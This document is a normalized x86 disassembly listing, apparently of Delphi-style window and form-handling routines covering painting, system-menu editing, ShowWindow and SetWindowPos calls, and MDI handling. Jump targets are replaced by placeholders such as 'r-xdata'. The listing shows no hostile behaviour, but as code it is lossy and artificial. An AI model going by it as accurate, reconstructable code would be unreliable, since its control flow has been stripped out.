mov [ esp ] eax
xor ebx ebx
mov eax [ esp ]
call sub_450da4
mov [ esp + 0xc ] eax
cmp [ esp + 0xc ] 0x0
je r-xdata
mov eax [ esp ]
call sub_450dd8
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
mov dl [ esp + 0x4 ]
mov eax [ esp + 0xc ]
mov si 0xffd1
call sub_403430
mov ebx eax
test [ esp + 0x4 ] bl
jne r-xdata
inc ebp
mov [ esp + 0x8 ] 0x0
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov dl [ esp + 0x4 ]
mov eax [ esp ]
call sub_43ce08
mov ebx eax
mov edx [ esp + 0x8 ]
mov eax [ esp ]
call sub_450e24
mov edi eax
cmp edi [ esp + 0xc ]
je r-xdata
inc [ esp + 0x8 ]
dec ebp
jne r-xdata
mov dl [ esp + 0x4 ]
mov eax edi
mov si 0xffd1
call sub_403430
or bl al
test [ esp + 0x4 ] bl
jne r-xdata
sub_4524c8
push ebx
push esi
add esp 0xffffffc0
mov esi edx
mov ebx eax
mov eax ebx
call sub_43db40
push eax
call IsIconic
test eax eax
jne r-xdata
push esp
mov eax ebx
call sub_43db40
push eax
call BeginPaint
mov esi eax
mov eax ebx
call sub_452350
push eax
push 0x0
push 0x0
push esi
call DrawIcon
push esp
mov eax ebx
call sub_43db40
push eax
call EndPaint
mov ax [ r-xdata ]
or ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
mov edx esi
mov eax ebx
call sub_43bcd0
mov ax [ r-xdata ]
not eax
and ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
jmp r-xdata
add esp 0x40
pop esi
pop ebx
retn
sub_452546
add [ eax ] al
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
add esp 0x10
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x170 ]
call sub_41ca38
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
jmp r-xdata
sub_4525a8
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_43db40
push eax
call IsIconic
test eax eax
jne r-xdata
mov [ edi ] 0x27
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edi
pop esi
retn
mov edx edi
mov eax esi
call sub_43bf94
pop edi
pop esi
retn
sub_4525f4
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x229 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x22f ] 0x1
je r-xdata
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_43db40
push eax
call GetSystemMenu
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x229 ] 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x2
jne r-xdata
push 0x0
push 0xf130
push ebx
call DeleteMenu
push 0x400
push 0x7
push ebx
call DeleteMenu
push 0x400
push 0x5
push ebx
call DeleteMenu
push 0x0
push 0xf030
push ebx
call DeleteMenu
push 0x0
push 0xf020
push ebx
call DeleteMenu
push 0x0
push 0xf000
push ebx
call DeleteMenu
push 0x0
push 0xf120
push ebx
call DeleteMenu
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x4
jne r-xdata
push 0x1
push 0xf020
push ebx
call EnableMenuItem
push 0x1
push 0xf030
push ebx
call EnableMenuItem
sub_4526f0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x248 ]
mov eax [ ebp - 0x4 ]
call sub_451118
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
pop ecx
pop ebp
retn
push ebp
call sub_4525f4
pop ecx
sub_452724
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x4 ] 0x2
jne r-xdata
mov edx esi
mov eax ebx
call sub_438a28
cmp [ ebx + 0x9b ] 0x1
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_43db40
push eax
call IsIconic
test eax eax
jne r-xdata
push 0x7
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_43db40
push eax
call SetWindowPos
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
push 0xa2
mov eax ebx
call sub_43db40
push eax
call PostMessageA
cmp [ ebx + 0x22e ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
mov edx eax
xor dl 0x1
or ecx 0xffffffff
mov eax ebx
call sub_437a00
pop esi
pop ebx
retn
sub_4527b4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
cmp [ ebx + 0x248 ] 0x0
je r-xdata
push 0x0
push 0x1
push 0x80
mov eax ebx
call sub_43db40
push eax
call SendMessageA
mov edx esi
mov eax ebx
call sub_43cd94
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
je r-xdata
push 0x0
mov eax ebx
call sub_43db40
push eax
call SetMenu
xor edx edx
mov eax [ ebx + 0x248 ]
call sub_44ac20
sub_452814
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_43be30
cmp [ ebx + 0x248 ] 0x0
je r-xdata
mov dx [ esi + 0x4 ]
mov eax [ ebx + 0x248 ]
call sub_44a634
test al al
jne r-xdata
pop esi
pop ebx
retn
sub_452860
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x248 ]
test eax eax
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
call sub_44ae94
cmp [ esi + 0xc ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_452898
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ edi + 0x248 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45293a
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
xor esi esi
cmp [ edx + 0x6 ] 0xffff
jne r-xdata
xor ebx ebx
movzx eax [ edx + 0x4 ]
test [ edx + 0x6 ] 0x10
je r-xdata
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov ecx ebx
mov edx eax
mov eax [ edi + 0x248 ]
call sub_44a594
mov esi eax
mov bl 0x1
push eax
mov eax [ edx + 0x8 ]
push eax
call GetSubMenu
test esi esi
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_457654
lea edx [ ebp - 0x4 ]
mov eax [ esi + 0x58 ]
call sub_4344bc
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_457654
jmp r-xdata
sub_452960
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp dl 0x1
je r-xdata
mov [ ebx + 0x22b ] dl
cmp [ ebx + 0x264 ] 0x0
je r-xdata
mov eax ebx
mov si 0xffd0
call sub_403430
pop esi
pop ebx
retn
mov eax [ ebx + 0x264 ]
mov edx [ eax ]
call [ edx + 0x10 ]
sub_4529a0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
call sub_40c748
test al al
jne r-xdata
and eax 0x7f
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov al 0x1
sub_4529cc
push ebx
push esi
mov ebx edx
xor edx edx
mov [ ebx + 0xc ] edx
test [ eax + 0x1c ] 0x10
jne r-xdata
mov esi [ ebx + 0x8 ]
xor edx edx
call sub_45218c
movzx ecx [ esi + 0x8 ]
mov edx [ esi + 0x4 ]
mov eax 0xb017
call sub_434294
test eax eax
je r-xdata
cmp [ eax + 0x22f ] 0x1
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0xc ] 0x1
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov edx [ eax + 0x248 ]
cmp [ edx + 0x5c ] 0x0
je r-xdata
sub_452a24
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf020
jne r-xdata
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf010
jne r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x44 ]
jne r-xdata
mov edx esi
mov eax ebx
call sub_43cc78
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_456008
jmp r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp eax 0xf120
jne r-xdata
cmp [ ebx + 0x5b ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf020
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x5b ] 0x0
je r-xdata
cmp [ ebx + 0x22b ] 0x1
jne r-xdata
mov eax ebx
mov si 0xffd0
call sub_403430
sub_452ab0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x8 ]
dec eax
je r-xdata
mov eax ebx
call sub_43db40
push eax
call IsIconic
test eax eax
je r-xdata
sub eax 0x2
je r-xdata
mov eax ebx
call sub_43db40
push eax
call IsZoomed
test eax eax
je r-xdata
mov [ ebx + 0x22c ] 0x2
jmp r-xdata
cmp [ ebx + 0x22c ] 0x0
je r-xdata
jmp r-xdata
mov [ ebx + 0x22c ] 0x1
mov [ ebx + 0x22c ] 0x3
jmp r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
pop esi
pop ebx
retn
xor eax eax
mov al [ ebx + 0x22c ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax ebx
call sub_43db40
push eax
call ShowWindow
mov [ ebx + 0x22c ] 0x0
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_452b48
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x22f ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_43db40
cmp eax [ ebx + 0x8 ]
sete al
mov ebx eax
mov edx ebx
mov eax esi
call sub_452128
test bl bl
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
test [ eax + 0x54 ] 0x4
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov dl 0x1
mov si 0xffd1
call sub_403430
sub_452ba0
cmp [ edx + 0x8 ] 0x0
je r-xdata
push 0x1
mov ecx [ edx + 0x4 ]
cmp ecx 0x1
sbb ecx ecx
neg ecx
mov edx [ eax + 0x220 ]
call sub_43e074
retn
mov eax [ edx + 0x4 ]
push eax
call SetFocus
retn
sub_452bcc
push ebx
push esi
mov esi edx
mov ebx eax
xor edx edx
mov eax ebx
call sub_45218c
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_452be8
push ebp
mov ebp esp
push ebx
mov ebx eax
xor eax eax
test ebx ebx
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x8 ]
mov cl 0x1
mov eax ebx
call sub_44a5c4
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0xc ]
xor ecx ecx
mov eax ebx
call sub_44a5c4
sub_452c28
push ebx
push esi
mov esi eax
xor ebx ebx
cmp [ esi + 0x150 ] 0x1
jne r-xdata
cmp [ esi + 0x150 ] 0x0
jne r-xdata
cmp [ esi + 0x158 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
cmp [ esi + 0x154 ] 0x0
je r-xdata
mov bl 0x1
jmp r-xdata
mov bl 0x1
sub_452c60
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0x150 ] 0x1
jne r-xdata
mov [ edx ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x154 ]
call sub_403fc0
mov [ edx ] 0x1
mov eax [ ebx + 0x158 ]
mov [ ecx ] eax
jmp r-xdata
pop ebx
pop ebp
retn 0x4
sub_452c94
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
test [ esi + 0x1c ] 0x10
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_452dec
lea eax [ ebp - 0x10 ]
call sub_403f6c
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
mov [ ebp - 0x9 ] 0x1
push ebp
mov eax [ esi + 0x248 ]
call sub_452be8
pop ecx
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ eax + 0xc ]
call sub_434238
mov ebx eax
jmp r-xdata
lea ecx [ ebp - 0x24 ]
xor edx edx
xor eax eax
call sub_4123e4
lea edx [ ebp - 0x24 ]
lea ecx [ ebp - 0x1c ]
mov eax esi
call sub_436e70
lea eax [ ebp - 0x1c ]
call sub_406864
mov [ ebp - 0x14 ] eax
push ebp
mov eax [ esi + 0x7c ]
call sub_452be8
pop ecx
mov [ ebp - 0x8 ] eax
test ebx ebx
je r-xdata
cmp [ ebp - 0x9 ] 0x1
jne r-xdata
cmp [ ebp - 0x9 ] 0x1
jne r-xdata
test ebx ebx
je r-xdata
mov eax ebx
call sub_452c28
test al al
je r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_4572f8
jmp r-xdata
mov ecx [ ebp - 0x14 ]
mov edx 0xd
mov eax [ rw-data ]
call sub_457360
mov ecx [ ebp - 0x8 ]
mov edx 0x8
mov eax [ rw-data ]
call sub_457360
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x9 ]
mov eax ebx
call sub_452c60
lea ecx [ ebp - 0x24 ]
xor edx edx
xor eax eax
call sub_4123e4
lea edx [ ebp - 0x24 ]
lea ecx [ ebp - 0x1c ]
mov eax ebx
call sub_436e70
lea eax [ ebp - 0x1c ]
call sub_406864
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov ebx [ ebx + 0x30 ]
mov edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_457290
test [ esi + 0x228 ] 0x8
je r-xdata
sub_452df4
push ebx
push esi
push ecx
mov [ esp ] edx
mov esi eax
test [ esi + 0x1c ] 0x2
jne r-xdata
mov edx [ esp ]
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edx
pop esi
pop ebx
retn
cmp [ esi + 0x22a ] 0x0
je r-xdata
mov edx [ esp ]
mov edx [ edx + 0x8 ]
mov eax [ esi + 0x74 ]
lea ecx [ edx + 0x18 ]
mov ebx [ eax + 0x14 ]
test ebx ebx
jbe r-xdata
mov ebx [ eax + 0x10 ]
test ebx ebx
jbe r-xdata
mov [ ecx ] ebx
lea ecx [ edx + 0x20 ]
mov ebx [ eax + 0xc ]
test ebx ebx
jbe r-xdata
mov [ ecx + 0x4 ] ebx
mov ebx [ eax + 0x8 ]
test ebx ebx
jbe r-xdata
mov [ ecx ] ebx
lea eax [ edx + 0x20 ]
push eax
lea eax [ edx + 0x24 ]
push eax
lea ecx [ edx + 0x1c ]
lea eax [ edx + 0x18 ]
mov edx eax
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
mov [ ecx + 0x4 ] ebx
sub_452e68
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx ]
add eax ecx
sub eax esi
cdq
xor eax edx
sub eax edx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x2e4 ]
jge r-xdata
pop esi
pop ebx
pop ebp
retn
sub esi ecx
mov [ ebx ] esi
sub_452e94
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x2e2 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43c0dc
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov esi [ ebx + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_450ea4
lea edx [ ebp - 0x14 ]
call sub_45466c
push ebp
mov eax [ ebp - 0x4 ]
call sub_450ea4
lea edx [ ebp - 0x24 ]
call sub_45466c
mov ecx [ ebp - 0x24 ]
lea eax [ esi + 0x8 ]
mov edx [ ebp - 0x14 ]
call sub_452e68
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
call sub_450ea4
lea edx [ ebp - 0x24 ]
call sub_45466c
mov ecx [ ebp - 0x20 ]
lea eax [ esi + 0xc ]
mov edx [ ebp - 0x10 ]
call sub_452e68
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x48 ]
lea eax [ esi + 0x8 ]
mov edx [ ebp - 0xc ]
call sub_452e68
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x4c ]
lea eax [ esi + 0xc ]
mov edx [ ebp - 0x8 ]
call sub_452e68
pop ecx
cmp [ eax + 0xc ] 0x0
je r-xdata
sub_452f4c
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x2
jne r-xdata
or [ ebx + 0x2f4 ] 0x20
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb3
call sub_403430
pop esi
pop ebx
retn
sub_452f70
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x2
jne r-xdata
and [ ebx + 0x2f4 ] 0xdf
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb1
call sub_403430
pop esi
pop ebx
retn
sub_452f94
push ebx
push esi
mov esi edx
mov ebx eax
push 0x12
call GetKeyState
test ax ax
jl r-xdata
mov edx esi
mov eax ebx
call sub_43cfbc
mov ax [ esi + 0x4 ]
sub ax 0x9
je r-xdata
push 0x11
call GetKeyState
test ax ax
jl r-xdata
add eax 0xffffffe4
sub ax 0x4
jb r-xdata
push 0x1
push 0x10
call GetKeyState
test ax ax
setge cl
mov edx [ ebx + 0x220 ]
mov eax ebx
call sub_43e074
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
mov eax [ ebx + 0x220 ]
test eax eax
je r-xdata
jmp r-xdata
pop esi
pop ebx
retn
push 0x0
mov dx [ esi + 0x4 ]
cmp dx 0x27
je r-xdata
mov cl 0x1
cmp dx 0x28
je r-xdata
xor ecx ecx
jmp r-xdata
mov edx [ eax + 0x30 ]
xchg edx eax
call sub_43e074
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_453030
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
call sub_457744
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x4
xor edx edx
push ebp
push r-xdata
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x4
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_453584
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfb
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405a6c
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b2a0
call sub_4039a8
xor eax eax
push ebp
push j_sub_4036bc#6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffaf
call sub_403430
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
push ebp
push sub_4530e8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffae
call sub_403430
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x6c ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4521dc
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x6
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_43b098
jmp r-xdata
mov eax [ rw-data ]
call sub_4548c8
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_436d5c
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
mov edx eax
add dl 0xfa
sub dl 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_43db40
mov esi eax
call GetActiveWindow
cmp esi eax
jne r-xdata
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_43db40
push eax
call SetWindowPos
jmp r-xdata
mov eax [ rw-data ]
call sub_4548bc
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_436da0
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
cmp al 0x5
jne r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x44 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x230 ] 0x7
jne r-xdata
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_43db40
push eax
call IsIconic
test eax eax
jne r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x230 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
call sub_43db40
push eax
call ShowWindow
push 0x97
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_43db40
push eax
call SetWindowPos
push ebx
call SetActiveWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_43db40
call sub_44de38
mov ebx eax
test eax eax
jge r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43db40
push eax
call ShowWindow
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_4548f8
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_436d5c
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ rw-data ]
call sub_4548c8
mov ebx eax
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov ebx [ esi + 0x48 ]
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0x48 ]
sar ebx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x22b ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43db40
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
shl edx 0x10
or eax edx
push eax
push 0x0
push 0x5
mov eax [ ebp - 0x4 ]
call sub_43db40
push eax
push DefMDIChildProcA
call CallWindowProcA
mov eax [ ebp - 0x4 ]
call sub_4375b8
push 0x0
mov eax [ ebp - 0x4 ]
call sub_43db40
push eax
push 0x223
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
push 0x3
mov eax [ ebp - 0x4 ]
call sub_43db40
push eax
call ShowWindow
jmp r-xdata
mov eax [ rw-data ]
call sub_4548ec
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
call sub_436da0
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ rw-data ]
call sub_4548bc
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
add ebx [ esi + 0x40 ]
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
sar eax 0x1
jns r-xdata
adc ebx 0x0
mov eax [ ebp - 0x4 ]
call sub_45148c
jmp r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
adc eax 0x0
jmp r-xdata
test ebx ebx
jge r-xdata
adc eax 0x0
add eax [ esi + 0x44 ]
jmp r-xdata
adc eax 0x0
test eax eax
jge r-xdata
xor ebx ebx
test eax eax
jge r-xdata
xor ebx ebx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov ecx eax
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
xor eax eax
mov eax [ ebp - 0x4 ]
call sub_45148c
jmp r-xdata
sub_4530ed
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_456e58
call sub_403a24
